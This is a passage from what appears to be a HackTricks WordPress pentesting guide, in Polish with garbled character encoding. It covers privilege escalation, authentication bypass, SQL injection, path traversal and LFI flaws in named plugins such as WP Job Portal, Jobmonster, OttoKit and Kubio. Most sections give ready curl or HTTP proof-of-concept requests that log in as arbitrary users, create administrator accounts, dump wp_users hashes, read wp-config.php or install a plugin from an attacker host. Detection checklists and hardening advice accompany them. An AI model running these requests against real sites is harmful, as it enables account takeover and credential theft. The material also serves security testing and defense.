- JeÅ›li uÅ¼ytkownik wczeÅ›niej miaÅ‚ wyÅ¼sze uprawnienia zapisane w `_asenha_view_admin_as_original_roles` i zostaÅ‚ zdegradowany, moÅ¼e je przywrÃ³ciÄ‡, odwiedzajÄ…c Å›cieÅ¼kÄ™ resetu.
- W niektÃ³rych wdroÅ¼eniach kaÅ¼dy uwierzytelniony uÅ¼ytkownik mÃ³gÅ‚ wywoÅ‚aÄ‡ reset dla innej nazwy uÅ¼ytkownika nadal obecnej w `viewing_admin_as_role_are` (bÅ‚Ä™dna autoryzacja).

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
W podatnych buildach usuwa to bieÅ¼Ä…ce role i ponownie dodaje zapisane oryginalne role (np. `administrator`), skutecznie eskalujÄ…c uprawnienia.

Detection checklist

- Szukaj funkcji przeÅ‚Ä…czania rÃ³l, ktÃ³re zapisujÄ… â€original rolesâ€ w user meta (np. `_asenha_view_admin_as_original_roles`).
- Zidentyfikuj Å›cieÅ¼ki reset/restore, ktÃ³re:
- OdczytujÄ… nazwy uÅ¼ytkownikÃ³w z `$_REQUEST` / `$_GET` / `$_POST`.
- ModyfikujÄ… role za pomocÄ… `add_role()` / `remove_role()` bez `current_user_can()` oraz `wp_verify_nonce()` / `check_admin_referer()`.
- AutoryzujÄ… na podstawie tablicy opcji wtyczki (np. `viewing_admin_as_role_are`) zamiast na podstawie uprawnieÅ„ aktora.

---

### Nieautoryzowana eskalacja uprawnieÅ„ przez przeÅ‚Ä…czanie uÅ¼ytkownika oparte na zaufanym ciasteczku na publicznym init (Service Finder â€œsf-bookingâ€)

NiektÃ³re wtyczki podpinajÄ… helpery do user-switching pod publiczny hook `init` i pobierajÄ… toÅ¼samoÅ›Ä‡ z ciasteczka kontrolowanego przez klienta. JeÅ›li kod wywoÅ‚uje `wp_set_auth_cookie()` bez weryfikacji uwierzytelnienia, uprawnieÅ„ i waÅ¼nego nonce, kaÅ¼dy nieautoryzowany odwiedzajÄ…cy moÅ¼e wymusiÄ‡ zalogowanie jako dowolny identyfikator uÅ¼ytkownika.

Typowy podatny wzorzec (uproszczone z Service Finder Bookings â‰¤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Dlaczego jest to podatne

- Publiczny hook `init` sprawia, Å¼e handler jest dostÄ™pny dla niezalogowanych uÅ¼ytkownikÃ³w (brak zabezpieczenia `is_user_logged_in()`).
- ToÅ¼samoÅ›Ä‡ jest odczytywana z cookie modyfikowalnego po stronie klienta (`original_user_id`).
- BezpoÅ›rednie wywoÅ‚anie `wp_set_auth_cookie($uid)` loguje Å¼Ä…dajÄ…cego jako tego uÅ¼ytkownika bez jakichkolwiek sprawdzeÅ„ capability/nonce.

Eksploatacja (bez uwierzytelnienia)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

OgÃ³lne WAFy brzegowe/serwerowe sÄ… nastawione na wykrywanie szerokich wzorcÃ³w (SQLi, XSS, LFI). Wiele wysokiego ryzyka luk w WordPress i wtyczkach to bÅ‚Ä™dy logiki/autoryzacji specyficzne dla aplikacji, ktÃ³re wyglÄ…dajÄ… jak nieszkodliwy ruch, chyba Å¼e silnik rozumie trasy WordPress i semantykÄ™ wtyczek.

Offensive notes

- Celuj w endpointy specyficzne dla wtyczek przy uÅ¼yciu czystych payloadÃ³w: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Najpierw testuj Å›cieÅ¼ki nieautoryzowane (AJAX `nopriv`, REST z liberalnym `permission_callback`, public shortcodes). DomyÅ›lne payloady czÄ™sto dziaÅ‚ajÄ… bez obfuskacji.
- Typowe przypadki o duÅ¼ym wpÅ‚ywie: eskalacja uprawnieÅ„ (broken access control), dowolne przesyÅ‚anie/pobieranie plikÃ³w, LFI, open redirect.

Defensive notes

- Nie polegaj na ogÃ³lnych sygnaturach WAF, aby chroniÄ‡ CVE dotyczÄ…ce wtyczek. WdroÅ¼ wirtualne poprawki specyficzne dla podatnoÅ›ci na warstwie aplikacji lub zaktualizuj szybko.
- Preferuj mechanizmy pozytywnej ochrony w kodzie (capabilities, nonces, Å›cisÅ‚a walidacja wejÅ›cia) zamiast negatywnych filtrÃ³w regex.

## Ochrona WordPress

### Regularne aktualizacje

Upewnij siÄ™, Å¼e WordPress, wtyczki i motywy sÄ… aktualne. PotwierdÅº takÅ¼e, Å¼e automatyczne aktualizacje sÄ… wÅ‚Ä…czone w wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Ponadto, **instaluj tylko zaufane wtyczki i motywy WordPress**.

### Wtyczki zabezpieczajÄ…ce

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Inne zalecenia**

- UsuÅ„ domyÅ›lnego uÅ¼ytkownika **admin**
- UÅ¼ywaj **silnych haseÅ‚** i **2FA**
- Okresowo **przeglÄ…daj** **uprawnienia** uÅ¼ytkownikÃ³w
- **Ogranicz liczbÄ™ prÃ³b logowania**, aby zapobiec atakom Brute Force
- ZmieÅ„ nazwÄ™ pliku **`wp-admin.php`** i zezwalaj na dostÄ™p tylko wewnÄ™trznie lub z okreÅ›lonych adresÃ³w IP.


### Nieuwierzytelniony SQL Injection z powodu niewystarczajÄ…cej walidacji (WP Job Portal <= 2.3.2)

Wtyczka rekrutacyjna WP Job Portal udostÄ™pniaÅ‚a zadanie **savecategory**, ktÃ³re ostatecznie wykonuje nastÄ™pujÄ…cy podatny kod w `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemy wprowadzone przez ten fragment:

1. **Unsanitised user input** â€“ `parentid` pochodzi bezpoÅ›rednio z Å¼Ä…dania HTTP.
2. **String concatenation inside the WHERE clause** â€“ brak uÅ¼ycia `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** â€“ chociaÅ¼ akcja jest wykonywana przez `admin-post.php`, jedynÄ… kontrolÄ… jest **CSRF nonce** (`wp_verify_nonce()`), ktÃ³ry kaÅ¼dy odwiedzajÄ…cy moÅ¼e pobraÄ‡ ze strony publicznej osadzonej przy pomocy shortcode `[wpjobportal_my_resumes]`.

#### Wykorzystanie

1. Pobierz Å›wieÅ¼y nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. WstrzykniÄ™cie dowolnego zapytania SQL przez naduÅ¼ycie `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
OdpowiedÅº ujawnia wynik wstrzykniÄ™tego zapytania lub modyfikuje bazÄ™ danych, potwierdzajÄ…c SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Inne zadanie, **downloadcustomfile**, pozwalaÅ‚o odwiedzajÄ…cym pobraÄ‡ **dowolny plik na dysku** poprzez path traversal. WraÅ¼liwy sink znajduje siÄ™ w `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` jest kontrolowany przez atakujÄ…cego i konkatenowany **bez sanitacji**. Ponownie, jedynÄ… barierÄ… jest **CSRF nonce**, ktÃ³ry moÅ¼na pobraÄ‡ ze strony z CV.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Serwer zwraca zawartoÅ›Ä‡ `wp-config.php`, leaking DB credentials and auth keys.

## Nieautoryzowane przejÄ™cie konta przez Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Wiele motywÃ³w/pluginÃ³w dostarcza "social login" helpery wystawione przez admin-ajax.php. JeÅ›li nieautoryzowana akcja AJAX (wp_ajax_nopriv_...) ufa identyfikatorom dostarczonym przez klienta, gdy brakuje danych providera, a nastÄ™pnie wywoÅ‚uje wp_set_auth_cookie(), to staje siÄ™ to peÅ‚nym obejÅ›ciem uwierzytelniania.

Typowy bÅ‚Ä™dny schemat (uproszczony)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider â€“ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ğŸ”¥ logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Dlaczego to jest eksploatowalne

- DostÄ™p bez uwierzytelnienia przez admin-ajax.php (akcja wp_ajax_nopriv_â€¦).
- Brak sprawdzeÅ„ nonce/capability przed zmianÄ… stanu.
- Brak weryfikacji dostawcy OAuth/OpenID; gaÅ‚Ä…Åº domyÅ›lna akceptuje dane od atakujÄ…cego.
- get_user_by('email', $_POST['id']) z nastÄ™pujÄ…cym wp_set_auth_cookie($uid) uwierzytelnia Å¼Ä…dajÄ…cego jako dowolny istniejÄ…cy adres e-mail.

Eksploatacja (bez uwierzytelnienia)

- Wymagania wstÄ™pne: atakujÄ…cy moÅ¼e osiÄ…gnÄ…Ä‡ /wp-admin/admin-ajax.php i zna/zgaduje poprawny adres e-mail uÅ¼ytkownika.
- Ustaw provider na nieobsÅ‚ugiwanÄ… wartoÅ›Ä‡ (lub pomiÅ„ go), aby trafiÄ‡ do gaÅ‚Ä™zi domyÅ›lnej i przekazaÄ‡ id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 z ciaÅ‚em JSON takim jak {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* dla ofiary; kolejne Å¼Ä…dania sÄ… uwierzytelnione.

Finding the action name

- SprawdÅº motyw/wtyczkÄ™ pod kÄ…tem rejestracji add_action('wp_ajax_nopriv_...', '...') w kodzie social login (np. framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Logi serwera pokazujÄ…ce niezautoryzowane Å¼Ä…dania POST do /wp-admin/admin-ajax.php z akcjÄ… social-login i id=<email>.
- Odpowiedzi 200 z JSON-em sukcesu bezpoÅ›rednio poprzedzajÄ…ce uwierzytelniony ruch z tego samego IP/User-Agent.

Hardening

- Nie wyprowadzaj toÅ¼samoÅ›ci na podstawie danych przesÅ‚anych przez klienta. Akceptuj tylko adresy e-mail/ID pochodzÄ…ce z zatwierdzonego tokena/ID dostawcy.
- Wymagaj nonce CSRF i sprawdzeÅ„ uprawnieÅ„ nawet dla helperÃ³w logowania; unikaj rejestrowania wp_ajax_nopriv_ chyba Å¼e jest to absolutnie konieczne.
- Waliduj i weryfikuj odpowiedzi OAuth/OIDC po stronie serwera; odrzucaj brakujÄ…cych/nieprawidÅ‚owych dostawcÃ³w (bez fallbacku do POST id).
- RozwaÅ¼ tymczasowe wyÅ‚Ä…czenie social login lub wirtualne zaÅ‚atanie na edge (zablokowanie podatnej akcji) do czasu naprawy.

Patched behaviour (Jobmonster 4.8.0)

- UsuniÄ™to niebezpieczny fallback oparty na $_POST['id']; $user_email musi pochodziÄ‡ z gaÅ‚Ä™zi zweryfikowanego dostawcy w switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers â‰¤ 1.0.82)

NiektÃ³re wtyczki udostÄ™pniajÄ… endpointy REST, ktÃ³re tworzÄ… wielokrotnego uÅ¼ytku â€œconnection keysâ€ lub tokeny bez weryfikacji uprawnieÅ„ wywoÅ‚ujÄ…cego. JeÅ›li trasa autoryzuje siÄ™ jedynie na podstawie odgadniÄ™tego atrybutu (np. username) i nie wiÄ…Å¼e klucza z uÅ¼ytkownikiem/sesjÄ… poprzez sprawdzenia uprawnieÅ„, kaÅ¼dy niezalogowany atakujÄ…cy moÅ¼e wygenerowaÄ‡ klucz i wywoÅ‚aÄ‡ uprzywilejowane akcje (utworzenie konta admina, akcje wtyczki â†’ RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC â€“ wygeneruj connection key i uÅ¼yj go
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# â†’ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Dlaczego to jest podatne
- WraÅ¼liwa Å›cieÅ¼ka REST chroniona jedynie przez dowÃ³d toÅ¼samoÅ›ci o niskiej entropii (username) lub brakujÄ…cy permission_callback
- Brak egzekwowania capability; wygenerowany klucz jest akceptowany jako uniwersalny bypass

Lista kontrolna wykrywania
- Grep w kodzie wtyczki w poszukiwaniu register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- KaÅ¼da Å›cieÅ¼ka, ktÃ³ra wydaje tokeny/klucze na podstawie toÅ¼samoÅ›ci dostarczonej w Å¼Ä…daniu (username/email) bez powiÄ…zania z uwierzytelnionym uÅ¼ytkownikiem lub capability
- Szukaj kolejnych Å›cieÅ¼ek, ktÃ³re akceptujÄ… wygenerowany token/klucz bez serwerowego sprawdzenia capability

Wzmocnienie
- Dla kaÅ¼dej uprzywilejowanej Å›cieÅ¼ki REST: wymagaj permission_callback, ktÃ³ry egzekwuje current_user_can() dla wymaganej capability
- Nie twÃ³rz dÅ‚ugowiecznych kluczy na podstawie toÅ¼samoÅ›ci dostarczonej przez klienta; jeÅ›li to konieczne, wydawaj krÃ³tkotrwaÅ‚e, powiÄ…zane z uÅ¼ytkownikiem tokeny po uwierzytelnieniu i ponownie sprawdzaj capability podczas uÅ¼ycia
- Zwaliduj kontekst uÅ¼ytkownika wywoÅ‚ujÄ…cego (wp_set_current_user nie jest wystarczajÄ…ce samo w sobie) i odrzucaj Å¼Ä…dania, gdzie !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse â†’ unauthenticated arbitrary plugin installation (FunnelKit Automations â‰¤ 3.5.3)

Nonces zapobiegajÄ… CSRF, nie autoryzacji. JeÅ›li kod traktuje pozytywne przejÅ›cie nonce jako zielone Å›wiatÅ‚o i nastÄ™pnie pomija sprawdzenia capability dla operacji uprzywilejowanych (np. install/activate plugins), niezalogowani atakujÄ…cy mogÄ… speÅ‚niÄ‡ sÅ‚abe wymaganie nonce i osiÄ…gnÄ…Ä‡ RCE przez zainstalowanie backdoored or vulnerable plugin.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce â€œpassesâ€
- Impact: full compromise via arbitrary plugin install/activation

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers modyfikujÄ…ce wtyczki/motywy uÅ¼ywajÄ…ce jedynie wp_verify_nonce()/check_admin_referer() i bez sprawdzenia uprawnieÅ„
- KaÅ¼da Å›cieÅ¼ka kodu, ktÃ³ra ustawia $skip_caps = true po walidacji nonce

Hardening
- Zawsze traktuj nonces wyÅ‚Ä…cznie jako tokeny CSRF; wymuszaj sprawdzenia uprawnieÅ„ niezaleÅ¼nie od stanu nonce
- Wymagaj current_user_can('install_plugins') oraz current_user_can('activate_plugins') przed dotarciem do kodu instalatora
- Odrzucaj nieuwierzytelniony dostÄ™p; unikaj udostÄ™pniania nopriv AJAX actions dla uprzywilejowanych przepÅ‚ywÃ³w

---

## Niezalogowany SQLi via s search parameter in depicter-* actions (Depicter Slider â‰¤ 3.6.1)

Wiele akcji depicter-* wykorzystywaÅ‚o parametr s (search) i konkatenowaÅ‚o go w zapytaniach SQL bez parametryzacji.

- Parameter: s (search)
- Flaw: bezpoÅ›rednia konkatenacja Å‚aÅ„cuchÃ³w w klauzulach WHERE/LIKE; brak uÅ¼ycia zapytaÅ„ przygotowanych i sanitizacji
- Impact: eksfiltracja bazy danych (uÅ¼ytkownicy, hashe), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Przeszukaj (grep) depicter-* action handlers oraz bezpoÅ›rednie uÅ¼ycie $_GET['s'] lub $_POST['s'] w SQL
- Przejrzyj niestandardowe zapytania przekazywane do $wpdb->get_results()/query(), Å‚Ä…czÄ…ce s

Hardening
- Zawsze uÅ¼ywaj $wpdb->prepare() lub wpdb placeholders; odrzucaj nieoczekiwane metaznaki po stronie serwera
- Dodaj Å›cisÅ‚Ä… biaÅ‚Ä… listÄ™ dla s i normalizuj do oczekiwanego zestawu znakÃ³w/dÅ‚ugoÅ›ci

---

## Unauthenticated Local File Inclusion via niezwalidowanej Å›cieÅ¼ki szablonu/pliku (Kubio AI Page Builder â‰¤ 2.5.1)

Akceptowanie Å›cieÅ¼ek kontrolowanych przez atakujÄ…cego w parametrze template bez normalizacji/izolacji pozwala na odczyt dowolnych lokalnych plikÃ³w, a czasami na wykonanie kodu, jeÅ›li pliki PHP/log moÅ¼liwe do include zostanÄ… zaÅ‚adowane w czasie wykonywania.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: brak normalizacji/biaÅ‚ej listy; traversal permitted
- Impact: ujawnienie sekretÃ³w (wp-config.php), potencjalne RCE w okreÅ›lonych Å›rodowiskach (log poisoning, includable PHP)

PoC â€“ read wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Lista kontrolna wykrywania
- KaÅ¼dy handler Å‚Ä…czÄ…cy Å›cieÅ¼ki Å¼Ä…daÅ„ i przekazujÄ…cy je do include()/require()/read sinks bez kontroli za pomocÄ… realpath()
- Szukaj wzorcÃ³w traversal (../), ktÃ³re prowadzÄ… poza zamierzony katalog szablonÃ³w

Wzmocnienie zabezpieczeÅ„
- WymuÅ› listÄ™ dozwolonych (allowlisted) szablonÃ³w; rozwiÄ…Å¼ Å›cieÅ¼ki przez realpath() i sprawdÅº str_starts_with(realpath(file), realpath(allowed_base))
- Normalizuj wejÅ›cie; odrzucaj sekwencje traversal i Å›cieÅ¼ki bezwzglÄ™dne; uÅ¼ywaj sanitize_file_name() tylko dla nazw plikÃ³w (nie peÅ‚nych Å›cieÅ¼ek)


## Å¹rÃ³dÅ‚a

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025â€™s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) â‰¤ 1.0.82 â€“ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations â‰¤ 3.5.3 â€“ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider â‰¤ 3.6.1 â€“ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder â‰¤ 2.5.1 â€“ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
